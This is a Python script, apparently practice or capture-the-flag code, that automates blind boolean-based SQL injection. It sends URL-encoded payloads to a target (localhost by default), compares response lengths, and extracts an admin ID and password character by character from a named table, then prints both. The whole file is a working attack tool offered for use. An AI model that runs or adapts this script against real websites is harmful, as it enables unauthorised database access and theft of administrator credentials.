# -*- coding: utf-8 -*-
"""
Created on Thu Oct 29 14:30:05 2020

@author: WinterMute1000
"""

import requests
DEFAULT_URL="http://127.0.0.1"
TRUE_RES=len(requests.get(DEFAULT_URL+"%27+AND+%271%27%3D%271%27+--+").text)
#TRUE_RES==different html length
KNOWN_TABLE_NAME="admin_tb" #Input Your Target table

def get_admin_id():
    admin_id=''
    for admin_id_length in range(1,31): # get admin_id length
        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+%28select+length%28admin_id%29+from
                                     +"""+KNOWN_TABLE_NAME+"+limit+0%2C1"
                                     +"%29%3D"+str(admin_id_length)+"+--+").text):
           for id_idx in range(0,admin_id_length+1):
               for ascii_code in range(32,127): #get one character columns name
                   if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+admin_id+from
                                      +"""+KNOWN_TABLE_NAME+"""+limit+0%2C1%29%2C"""+str(id_idx)+
                                      """%2C1%29%29%3D"""+str(ascii_code)+"+--+").text):
                       
                       admin_id=admin_id+chr(ascii_code)
           break
    return admin_id

def get_admin_passwd():
    admin_passwd=''
    for admin_id_length in range(1,50): # get admin_id length
        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+%28select+length%28admin_pass%29+from
                                     +"""+KNOWN_TABLE_NAME+"+limit+0%2C1"
                                     +"%29%3D"+str(admin_id_length)+"+--+").text):
           for id_idx in range(0,admin_id_length+1):
               for ascii_code in range(32,127): #get one character columns name
                   if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+admin_pass+from
                                      +"""+KNOWN_TABLE_NAME+"""+limit+0%2C1%29%2C"""+str(id_idx)+
                                      """%2C1%29%29%3D"""+str(ascii_code)+"+--+").text):
                       
                       admin_passwd=admin_passwd+chr(ascii_code)
           break
    return admin_passwd

if __name__=="__main__":
    print("admin id:"+get_admin_id())
    print("admin passwd:"+get_admin_passwd())
       
               